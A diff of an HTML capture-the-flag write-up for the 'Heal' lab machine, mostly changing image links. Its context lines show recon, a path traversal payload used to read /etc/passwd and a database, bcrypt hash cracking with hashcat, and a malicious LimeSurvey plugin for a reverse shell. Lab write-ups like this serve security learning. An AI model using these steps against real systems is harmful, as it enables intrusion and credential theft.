@@ -33,7 +33,7 @@
           </div>
         </header>
         <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
-<p><img src="/_resources/4af11adbab88413e803160b19d4947b2.png" /></p>
+<p><img src=":/4af11adbab88413e803160b19d4947b2" alt="1bd08da2f36fc09ef9303254a1358f84.png" /></p>
 <div><pre class="hljs"><code>└──╼ $whatweb heal.htb
 http://heal.htb <span class="hljs-comment">[200 OK]</span> Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[nginx/1.18.0 (Ubuntu)]</span>, IP<span class="hljs-comment">[10.129.110.223]</span>, Script, Title<span class="hljs-comment">[Heal]</span>, X-Powered-By<span class="hljs-comment">[Express]</span>, nginx<span class="hljs-comment">[1.18.0]</span></code></pre></div>
 <div><pre class="hljs"><code>└──╼ $nmap -p- -A heal.htb
@@ -73,22 +73,22 @@ Found: API.heal.htb Status: 200 [Size: 12515]
 Found: Api.heal.htb Status: 200 [Size: 12515]</code></pre></div>
 <h1 id="main-site">Main site</h1>
 <p>After creating an account, we are greeted with resume builder.</p>
-<p><img src="/_resources/3f2d8c1fb55040669f7816278330093c.png" /></p>
+<p><img src=":/3f2d8c1fb55040669f7816278330093c" alt="306399f88c9af7792b15c1f68c5e0788.png" /></p>
 <p>It can be exported to pdf.</p>
-<p><img src="/_resources/198a41ca10fb47c4bdfb7eb277bbdbb6.png" /></p>
+<p><img src=":/198a41ca10fb47c4bdfb7eb277bbdbb6" alt="4d1d5121aee815a32b349ecb2151cb17.png" /></p>
 <p>In burp we can modify the contents field to generate any pdf we want.</p>
-<p><img src="/_resources/5bec932169054eddb7479b8708fe17f8.png" /></p>
+<p><img src=":/5bec932169054eddb7479b8708fe17f8" alt="1e00e7a73afcdce90236722a9edab966.png" /></p>
 <p>Exploring the site we can aslo find survey under a new subdomain, <code>take-survey.heal.htb</code>.</p>
 <p>We can also see that all of the actions are done through an api. Running <code>curl api.heal.htb</code> gets us:</p>
 <div><pre class="hljs"><code>    <span class="hljs-section">&lt;li&gt;</span><span class="hljs-section">&lt;strong&gt;</span><span class="hljs-attribute">Rails</span> version:&lt;/strong&gt; <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">4</span>&lt;/li&gt;
     <span class="hljs-section">&lt;li&gt;</span><span class="hljs-section">&lt;strong&gt;</span><span class="hljs-attribute">Ruby</span> version:&lt;/strong&gt; ruby <span class="hljs-number">3</span>.<span class="hljs-number">3</span>.<span class="hljs-number">5</span> (<span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">03</span> revision ef084cc8f4)<span class="hljs-meta"> [x86_64-linux]&lt;/li&gt;</span></code></pre></div>
 <p>Testing for <code>https://api.heal.htb/?name=abc</code> gets us rails site.</p>
-<p><img src="/_resources/de710d3a5d6b44bd91153044e72a87d2.png" /></p>
+<p><img src=":/de710d3a5d6b44bd91153044e72a87d2" alt="110e5067fb8ed9046d4515fa8e2aace2.png" /></p>
 <h1 id="pdf-downloads">PDF downloads</h1>
 <p>Looking further in burp we can monitor how pdf’s are created. First file is sent to <code>/exports</code> and then we are downloading it from <code>/download</code>, i.e: <code>/download?filename=b8ee5207be6ef2a567c2.pdf</code></p>
-<p><img src="/_resources/90194eb158f9488db895d2a2ca3b100a.png" /></p>
+<p><img src=":/90194eb158f9488db895d2a2ca3b100a" alt="23f0a096425c2b99e393822e8ba6e93c.png" /></p>
 <p>We can test this for path traversal and try to download <code>../../../../../../../../../etc/passwd</code>. We get then pdf file, that opened in text editor looks like what we wanted.</p>
-<p><img src="/_resources/2bab1a40433445b6a636966c5f484e88.png" /></p>
+<p><img src=":/2bab1a40433445b6a636966c5f484e88" alt="8106583f9d8880c2229b84c685869889.png" /></p>
 <p>Inspecting it we can see two users on our system, ralph and ron. www is ther as usual.</p>
 <div><pre class="hljs"><code><span class="hljs-symbol">ralph:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:ralph</span><span class="hljs-symbol">:/home/ralph</span><span class="hljs-symbol">:/bin/bash</span>
 <span class="hljs-symbol">ron:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/ron</span><span class="hljs-symbol">:/bin/bash</span>
@@ -151,7 +151,7 @@ http {
   <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*default</span>
   <span class="hljs-attr">database:</span> <span class="hljs-string">storage/development.sqlite3</span></code></pre></div>
 <p>We can then get development database (located under <code>../../storage/development.sqlite3</code>) and finaly get user hash.</p>
-<p><img src="/_resources/76ec61811e4e4e0d8686a6f19473e56c.png" /></p>
+<p><img src=":/76ec61811e4e4e0d8686a6f19473e56c" alt="58b1ce3f36417e80604901474e3853b7.png" /></p>
 <div><pre class="hljs"><code><span class="hljs-attribute">1</span>|ralph@heal.htb|$<span class="hljs-number">2</span>a$<span class="hljs-number">12</span>$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|<span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">27</span> <span class="hljs-number">07</span>:<span class="hljs-number">49</span>:<span class="hljs-number">31</span>.<span class="hljs-number">614858</span>|<span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">27</span> <span class="hljs-number">07</span>:<span class="hljs-number">49</span>:<span class="hljs-number">31</span>.<span class="hljs-number">614858</span>|Administrator|ralph|<span class="hljs-number">1</span></code></pre></div>
 <p>Running <code>hashcat -m 3200 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt</code> cracks us the hash.</p>
 <div><pre class="hljs"><code>hashcat <span class="hljs-attr">--show</span> -m <span class="hljs-number">3200</span> hash<span class="hljs-selector-class">.txt</span>
@@ -177,7 +177,7 @@ Running dirsearch gets us:</p>
 [<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>pma<span class="hljs-regexp">/  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login
 [<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">49</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>sxd<span class="hljs-regexp">/  -&gt;  http:/</span><span class="hljs-regexp">/take-survey.heal.htb/i</span>ndex.php<span class="hljs-regexp">/admin/</span>authentication<span class="hljs-regexp">/sa/</span>login</code></pre></div>
 <p>Using ralphs creds let’s us in.</p>
-<p><img src="/_resources/cf80d8824d4546fe93fb073a89876e13.png" /></p>
+<p><img src=":/cf80d8824d4546fe93fb073a89876e13" alt="87d550088d776ab8c1f3ccc7ae72a689.png" /></p>
 <p>We can then add plugin, activate it and get reverse shell by entering the site. Malicious plugin can be found on <a title="http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php" href="http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php">github</a>. It is important to add version 6.6.4 to the config.xml file, otherwise we will get version mismatch. We get logged in as www-data.</p>
 <p>For QoL we can stabilize the shell.</p>
 <div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
